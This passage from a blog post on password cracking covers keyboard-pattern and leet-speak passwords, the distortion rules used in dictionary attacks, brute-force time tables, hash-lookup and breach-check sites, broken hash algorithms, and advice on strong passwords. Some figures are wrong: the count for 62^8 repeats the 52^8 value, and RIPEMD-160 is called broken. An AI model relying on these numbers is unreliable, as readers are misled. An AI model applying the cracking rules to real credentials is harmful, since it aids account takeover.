Unlike Keywalk passwords, these passwords involve selecting characters that are not adjacent to each other on a keyboard layout but follow a non-linear path. They might involve skipping or jumping over keys. Example: \u0026ldquo;plmokn\u0026rdquo;, \u0026ldquo;qawsed\u0026rdquo;, \u0026ldquo;okmijn\u0026rdquo; Leet Speak Substitution Leet Speak involves replacing letters with similar-looking characters or symbols. While it can increase complexity, it\u0026rsquo;s still vulnerable to dictionary-based attacks unless combined with other techniques. Example: \u0026ldquo;p@ssw0rd\u0026rdquo; (for \u0026ldquo;password\u0026rdquo;), \u0026ldquo;l33t\u0026rdquo; (for \u0026ldquo;leet\u0026rdquo;), \u0026ldquo;h4ck3r\u0026rdquo; (for \u0026ldquo;hacker\u0026rdquo;). Password Distortion Rules Distortion rules in password cracking refer to various strategies and techniques attackers use to modify or manipulate passwords to crack them more effectively. These rules are applied during brute-force or dictionary attacks to generate a more extensive set of potential passwords by systematically altering known patterns, words, or phrases.\nHere are some common distortion rules used in password cracking:\nCharacter Substitution This rule involves replacing certain characters in a password. Example: \u0026ldquo;password\u0026rdquo; might be distorted to \u0026ldquo;cnffjbeq\u0026rdquo; (ROT13 Algorithm). Case Variations Case variations involve changing the case of letters within a password, making some uppercase and some lowercase. This rule increases the search space for cracking algorithms. Example: \u0026ldquo;Password\u0026rdquo; might be distorted to \u0026ldquo;pAsswOrd\u0026rdquo;. Repetition Repetition involves adding additional instances of characters or sequences within a password. This rule capitalizes on patterns humans tend to use, such as repeating characters or sequences. Example: \u0026ldquo;hello\u0026rdquo; might be distorted to \u0026ldquo;hellohello\u0026rdquo;. Appending or Prepending Appending or prepending involves adding additional characters or sequences to the beginning or end of a password. Common choices include numbers, symbols, or words. Example: \u0026ldquo;password\u0026rdquo; might be distorted to \u0026ldquo;password123\u0026rdquo; or \u0026ldquo;@password\u0026rdquo;. Keyboard Patterns Keyboard patterns involve manipulating passwords based on their proximity on a standard keyboard layout. This includes variations like adjacent keys, diagonal keys, or alternate rows. Example: \u0026ldquo;qwerty\u0026rdquo; might be distorted to \u0026ldquo;qweRty\u0026rdquo;. Common Affixes This rule applies common prefixes or suffixes to passwords. Attackers might add common words or numbers before or after existing passwords to attempt cracking. Example: \u0026ldquo;password\u0026rdquo; might be distorted to \u0026ldquo;password123\u0026rdquo; or \u0026ldquo;mypassword\u0026rdquo;. L33t Speak This type of Character Substitution replaces letters with visually similar numbers or symbols; in Character Substitution, the characters don\u0026rsquo;t have to be identical in any form. This rule capitalizes on common substitutions used by users to make their passwords more complex. For example, \u0026rsquo;e\u0026rsquo; might be replaced with \u0026lsquo;3\u0026rsquo;, \u0026lsquo;a\u0026rsquo; might be replaced with \u0026lsquo;@\u0026rsquo;, and \u0026lsquo;o\u0026rsquo; might be replaced with \u0026lsquo;0\u0026rsquo;. Example: \u0026ldquo;Password\u0026rdquo; might be distorted to \u0026ldquo;P@$$w0rd\u0026rdquo;. Password Strength It is not always possible to crack a Hash and Obtain a password (in our lifetime). Let us take an example, suppose we have the following information:\nHash Hashing Algorithm Length of the Password For the sake of example, let us assume:\nRate of calculating the hashes = 100 Million Hashes / second Length of the Password = 8 Character Set 0 - Numbers Characters Available = 10\nNumber of Possible Passwords = 10^8 = 100000000 Passwords\nTime Taken to Crack the Password = 1 second\nCharacter Set I - Lowercase ASCII Characters Characters Available = 26\nNumber of Possible Passwords = 26^8 = 208827064576 Passwords\nTime Taken to Crack the Password = 2088.27 seconds = 34.8 minutes\nCharacter Set II - Lowercase ASCII Characters + Numbers Characters Available = 36\nNumber of Possible Passwords = 36^8 = 2.821109907×10¹² Passwords\nTime Taken to Crack the Password = 28211.09 seconds = 470.18 minutes = 7.83 hours\nCharacter Set III - Lowercase ASCII Characters + Uppercase ASCII Characters Characters Available = 52\nNumber of Possible Passwords = 52^8 = 5.345972853×10¹³ Passwords\nTime Taken to Crack the Password = 534597.28 seconds = 8909.95 minutes = 148.49 hours = 6.18 Days\nCharacter Set IV - Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers Characters Available = 62\nNumber of Possible Passwords = 62^8 = 5.345972853×10¹³ Passwords\nTime Taken to Crack the Password = 2183401.05 seconds = 36390.01 minutes = 606.5 hours = 25.27 Days\nCharacter Set V - Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers + Special Characters Characters Available = 128\nNumber of Possible Passwords = 128^8 = 7.205759404×10¹⁶ Passwords\nTime Taken to Crack the Password = 720575940.37 seconds = 12009599.00 minutes = 200159.98 hours = 8339.99 Days = 22.84 Years\nSo, here we saw that the time to crack the password increases significantly when we use more characters, making our password more complex.\nHere, in this case, we knew how long the password was. But in most real-life scenarios, when Hash Cracking is involved, we don\u0026rsquo;t know anything about the length of the password, making it even more time-consuming to do a Brutforce attack.\nThat\u0026rsquo;s why you should keep a complex password that uses all of the following Characters:\nLowercase ASCII Characters Uppercase ASCII Characters Numbers Special Characters Below is the table that shows how much time it would take to crack a hash with certain conditions\nLength Numbers Lowercase ASCII Characters Lowercase ASCII Characters + Numbers Lowercase ASCII Characters + Uppercase ASCII Characters Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers Lowercase ASCII Characters + Uppercase ASCII Characters + Numbers + Special Characters 8 1 sec 34.8 min 7.83 hours 6.18 days 25.27 days 22.84 years 9 10 sec 15.08 hours 8.57 days 162.12 days 1.8 years 57.1 years 10 1.67 min 16.28 days 223.03 days 11.51 years 47.46 years 1497.55 years 11 16.67 min 281.93 days 10.56 years 199.92 years 820.928 years 25843.264 years 12 2.78 hours 9.515 years 130.341 years 2463.897 years 1023042.47 years 6133565802.2 years This table is just an example and not indicative of the actual time taken for hash cracking. A good understanding of multithreading and CUDA programming can even accelerate this by a factor. Success Rate of Hash Cracking Based on the calculations shown in the previous section, we\u0026rsquo;re convinced that Hash Cracking is difficult. So, one question arises: why does an attacker attempt to crack a hash when it would take such a long time? When an attacker gains access to a list of Hash Protected Passwords (from a Compromised Database or any other method), they run a dictionary attack instead of brute force. Because the main aim here is to crack as many passwords as possible instead of targeting a specific one, the attacker would obtain passwords that were present in the wordlist. In such scenarios, the success rate of Hash Cracking is higher than expected.\nSecurity Measure against Hash Cracking You might think that keeping a 20-character-long password and using all 128 Characters would protect you from an attacker attempting to crack the hash. But that\u0026rsquo;s not always true. It would make no difference if that specific 20-character-long password is present in the wordlist used by the attacker in a dictionary attack.\nAlso, creating a password that contains your Name, Date of Birth, Family Member\u0026rsquo;s Name, or any other personal information is not considered secure. It won\u0026rsquo;t take much time to make a custom wordlist that contains combinations of this personal information from programs like CUPP and run a dictionary attack to crack your password.\nSo, to enhance the Security of your password, here are a few points to keep in mind:\nUse a long password: The above table shows that cracking time significantly increases with password length. We can make a small sentence with spelling mistakes that can be used as your password. Use Lowercase + Uppercase ASCII Letters + Numbers + Special Characters: cracking time significantly increases. Also, we can include spaces and some characters other than the English Alphabet (I think that would work on most of the websites) Keep All Passwords Different: An attacker could access another asset using a password cracked from somewhere else. We surf the Internet, and we all have to put passwords for various websites that can\u0026rsquo;t be trusted, so keeping different passwords would make sure that a breach from any of these websites won\u0026rsquo;t affect our significant assets (like Google Account, etc.) Enable Double Factor Authentication: Even if all of the above methods fail or your password was compromised by some other means (Phishing, etc), you would be secure if you\u0026rsquo;ve enabled double-factor authentication correctly. You would be notified by anyone trying to access your account with the correct password and would need your action to continue further Change your Passwords after specific periods: We don\u0026rsquo;t know how our data is being used because it\u0026rsquo;s not always possible to tell how things work under the hood. Whether our passwords are hashed at the backend (with/without salts) or stored as plain text, if that\u0026rsquo;s not what you think, then there won\u0026rsquo;t be any wordlists like rockyou. It is impossible to check whether someone else has your password. Even if someone targets you, you can enhance your Security and privacy by changing your password regularly (after six months). Note The above points do not Guarantee 100% Protection; they only enhance Security.\nChecking Leaked Passwords There are several websites you can use to check whether your password has been leaked somewhere online or not. Here are some popular ones:\nHave I Been Pwned: Check if your email or phone is in a data breach Dehashed: Free deep-web scans and protection against credential leaks LeakCheck.io: Make sure your credentials haven\u0026rsquo;t been compromised crackstation.net: Massive pre-computed lookup tables to crack password hashes HashKiller: Pre-cracked Hashes, easily searchable LeakedPassword: Search across multiple data breaches to see if your pass has been compromised BugMeNot: Find and share logins Source: edoardottt/awesome-hacker-search-engines\nBroken Hashing Algorithms Broken hashing algorithms refer to cryptographic hash functions that have been compromised in some way, making them unsuitable for security purposes. Some hashing algorithms have been found to have vulnerabilities that allow attackers to exploit weaknesses in the algorithm, potentially leading to collisions (two different inputs producing the same hash value), pre-image attacks (deriving the original input from its hash value), or other security breaches. Some well-known examples of broken hashing algorithms include:\nmd5: MD5 was widely used but has been found to have multiple vulnerabilities, including collision attacks. It is considered cryptographically broken and unsuitable for further use in secure applications. sha1: SHA-1 is another widely used hashing algorithm that has been demonstrated to have vulnerabilities. Collision attacks against SHA-1 have been demonstrated, making it insecure for many cryptographic applications. sha0: An earlier version of the SHA algorithm, SHA-0, was quickly replaced by SHA-1 due to vulnerabilities found in it. RIPEMD-160 (RACE Integrity Primitives Evaluation Message Digest 160): Although not as widely used as MD5 or SHA-1, RIPEMD-160 has also been found to have vulnerabilities and is considered broken. It\u0026rsquo;s essential to use modern and secure hashing algorithms, such as SHA-256, SHA-3, or bcrypt, for cryptographic purposes to ensure data integrity and security. Additionally, algorithms should be regularly evaluated for potential weaknesses, and older algorithms should be replaced as needed to maintain security standards.\nNote We\u0026rsquo;ve only discussed Offline Password Cracking because Online Password cracking by Brute Forcing Login Services would be infeasible in today\u0026rsquo;s scenario. After all, IPs would get blocked after a certain number of times. The process would be too slow even if we try to log in with proxies (different IPs).\n","date":"2024-09-23T04:56:45+05:30","image":"http://localhost:1313/p/password-cracking/assets/images/password_cracking_hu12109471508555614096.jpeg","permalink":"http://localhost:1313/p/password-cracking/","title":"Password Cracking"}]